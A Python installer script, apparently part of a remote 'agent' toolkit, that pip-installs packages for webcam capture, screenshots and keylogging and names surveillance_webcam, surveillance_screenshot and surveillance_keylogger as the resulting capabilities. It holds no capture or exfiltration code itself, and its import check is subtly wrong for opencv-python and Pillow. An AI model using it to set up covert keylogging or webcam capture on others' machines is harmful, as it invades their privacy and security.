#!/usr/bin/env python3
"""
Dependency installation script for the agent
Run this script on the agent system to install required packages
"""
import subprocess
import sys
import os

def install_package(package):
    """Install a package using pip"""
    try:
        print(f"Installing {package}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        print(f"✓ {package} installed successfully")
        return True
    except subprocess.CalledProcessError as e:
        print(f"✗ Failed to install {package}: {e}")
        return False

def check_package(package):
    """Check if a package is already installed"""
    try:
        __import__(package)
        print(f"✓ {package} is already installed")
        return True
    except ImportError:
        print(f"✗ {package} is not installed")
        return False

def main():
    print("Agent Dependency Installer")
    print("=" * 40)
    
    # Core dependencies for surveillance
    packages = [
        "opencv-python",      # For webcam functionality
        "numpy",              # Required by OpenCV
        "Pillow",             # For image processing
        "pyautogui",          # For screenshots
        "pynput",             # For keylogging
        "psutil",             # For system monitoring
    ]
    
    print("\nChecking current installations...")
    installed_count = 0
    
    for package in packages:
        if check_package(package.replace("-", "_")):
            installed_count += 1
    
    print(f"\n{installed_count}/{len(packages)} packages already installed")
    
    if installed_count == len(packages):
        print("\n🎉 All required packages are already installed!")
        print("Your agent should now be able to capture webcam images and screenshots.")
        return
    
    print("\nInstalling missing packages...")
    print("=" * 40)
    
    success_count = 0
    for package in packages:
        if install_package(package):
            success_count += 1
    
    print(f"\nInstallation complete: {success_count}/{len(packages)} packages installed successfully")
    
    if success_count == len(packages):
        print("\n🎉 All packages installed successfully!")
        print("Please restart your agent for the changes to take effect.")
        print("\nYour agent should now be able to:")
        print("  • Capture webcam images (surveillance_webcam)")
        print("  • Take screenshots (surveillance_screenshot)")
        print("  • Perform keylogging (surveillance_keylogger)")
    else:
        print(f"\n⚠️  {len(packages) - success_count} packages failed to install.")
        print("Please check the error messages above and try installing them manually.")

if __name__ == "__main__":
    main()
